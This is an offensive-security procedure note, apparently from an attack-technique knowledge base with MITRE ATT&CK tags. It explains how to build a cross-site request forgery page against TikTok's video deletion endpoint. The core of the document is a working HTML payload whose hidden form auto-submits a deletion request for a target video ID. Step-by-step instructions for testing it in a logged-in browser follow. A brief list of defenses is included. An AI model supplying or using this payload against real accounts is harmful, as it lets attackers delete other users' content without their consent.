---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - csrf
  - exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:36.174Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-CSRF-Malicious-Form

## Summary

This procedure creates a malicious HTML form that exploits the CSRF vulnerability in TikTok's video deletion by auto-submitting a forged request using the victim's authenticated session.

## Description

Once the deletion endpoint is known, an attacker crafts an HTML page with a hidden form that mimics the legitimate deletion request. The form targets the vulnerable endpoint and includes the video ID of the target public video. When loaded in the victim's browser (while logged into TikTok), the JavaScript auto-submits the form, leveraging the browser's cookie-based authentication to perform the deletion without user consent. This works due to the lack of CSRF token validation.

## Requirements

1. Known deletion endpoint and parameters from reconnaissance
2. Target video ID (obtainable from public video URLs)
3. Ability to host or deliver the HTML (e.g., via link)

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies (Lax/Strict) to prevent cross-origin submissions
- Validate referer headers for sensitive actions
- Use CAPTCHA or secondary confirmation for deletions

## Objectives

1. Forge a valid deletion request without tokens
2. Automate submission to avoid user interaction
3. Target specific public videos for removal

## Instructions

### Step 1: Create HTML Form

**Context**: Build the basic form structure matching the endpoint.

Write an HTML file:

```html
<!DOCTYPE html>
<html><body>
<form action="https://www.tiktok.com/aweme/v1/aweme/delete/" method="POST" id="deleteForm">
    <input type="hidden" name="device_id" value="">
    <input type="hidden" name="aweme_id" value="TARGET_VIDEO_ID">
</form>
<script>document.getElementById('deleteForm').submit();</script>
</body></html>
```

Fill in parameters based on captured request; `TARGET_VIDEO_ID` from the video URL.

**Expected Output**: HTML file that, when opened, attempts a POST to the endpoint.

### Step 2: Test in Authenticated Session

**Context**: Verify the form triggers deletion.

Open the HTML in a browser logged into TikTok with a test video. Ensure no errors and video is deleted.

**Expected Output**: Successful deletion without manual input.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit]]
